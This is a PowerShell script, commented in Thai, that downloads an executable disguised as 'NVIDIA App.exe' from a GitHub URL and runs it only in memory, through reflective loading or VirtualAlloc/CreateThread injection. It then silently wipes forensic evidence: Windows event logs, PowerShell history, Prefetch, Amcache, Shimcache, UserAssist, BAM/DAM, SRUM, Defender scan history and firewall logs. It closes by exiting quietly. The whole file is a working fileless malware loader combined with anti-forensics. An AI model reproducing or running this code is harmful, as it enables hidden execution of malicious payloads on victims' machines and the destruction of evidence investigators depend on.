# ============================================
# 1. ปิดการบันทึกประวัติ
# ============================================
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ============================================
# 2. ฟังก์ชันดาวน์โหลด EXE (ไม่เขียนไฟล์)
# ============================================
function Download-EXE {
    param([string]$Url)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.Proxy = $null
        return $wc.DownloadData($Url)
    } catch {
        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
        return $response.Content
    }
}

# ============================================
# 3. รัน EXE จากหน่วยความจำ (Memory Execution)
# ============================================
function Invoke-MemoryExecution {
    param([byte[]]$Bytes)
    
    try {
        $assembly = [System.Reflection.Assembly]::Load($Bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, (, [string[]] @()))
            return $true
        }
    } catch {}

    try {
        $ReflectiveInject = {
            param([byte[]]$PEBytes)
            $kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
[DllImport("kernel32.dll")]
public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
'@ -Name "Kernel32" -Namespace "Win32" -PassThru

            $size = $PEBytes.Length
            $ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
            if ($ptr -ne [IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $ptr, $size)
                $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                if ($thread -ne [IntPtr]::Zero) {
                    $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF)
                    $kernel32::VirtualFree($ptr, 0, 0x8000)
                    return $true
                }
            }
            return $false
        }
        return & $ReflectiveInject $Bytes
    } catch {
        return $false
    }
}

# ============================================
# 4. ดาวน์โหลดและรัน EXE (Memory Only)
# ============================================
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
$bytes = Download-EXE -Url $exeUrl

if ($bytes -and $bytes.Length -gt 0) {
    $executed = Invoke-MemoryExecution -Bytes $bytes
    if (-not $executed) {
        # ไม่เขียนไฟล์เด็ดขาด
    }
}

# ============================================
# 5. ล้างร่องรอยทุกอย่าง (ไม่ถามยืนยัน)
# ============================================

# --- ล้าง PowerShell History ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
    Clear-History
} catch {}

# --- ล้าง Event Logs (Security, System, Application, PowerShell) ---
try {
    wevtutil cl Security 2>$null
    wevtutil cl System 2>$null
    wevtutil cl Application 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
} catch {}

# --- ล้าง Prefetch ---
try {
    Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Amcache ---
try {
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve.LOG1" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve.LOG2" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Recent Documents ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Temp Files ---
try {
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Registry (RunMRU, TypedURLs, Search) ---
try {
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\SearchHistory" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Jump Lists ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Thumbnail / Icon Cache ---
try {
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\IconCache.db" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง BAM/DAM ---
try {
    Stop-Service -Name "bam","dam" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง DNS Cache ---
try {
    ipconfig /flushdns 2>$null
} catch {}

# --- ล้าง Windows Defender Protection History ---
try {
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-*" -Force -ErrorAction SilentlyContinue
    Start-Service -Name "WinDefend" -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Firewall Logs ---
try {
    Remove-Item "C:\Windows\System32\LogFiles\Firewall\pfirewall.log" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง Shimcache ---
try {
    Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Name "AppCompatCache" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง UserAssist ---
try {
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง RecentFileCache ---
try {
    Remove-Item "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
} catch {}

# --- ล้าง SRUM (Network usage) ---
try {
    Stop-Service -Name "srumsvc" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\sru\srudb.dat" -Force -ErrorAction SilentlyContinue
} catch {}

# ============================================
# 6. ปิดตัวเองอย่างเงียบ
# ============================================
$bytes = $null
$exeUrl = $null
[Environment]::Exit(0)
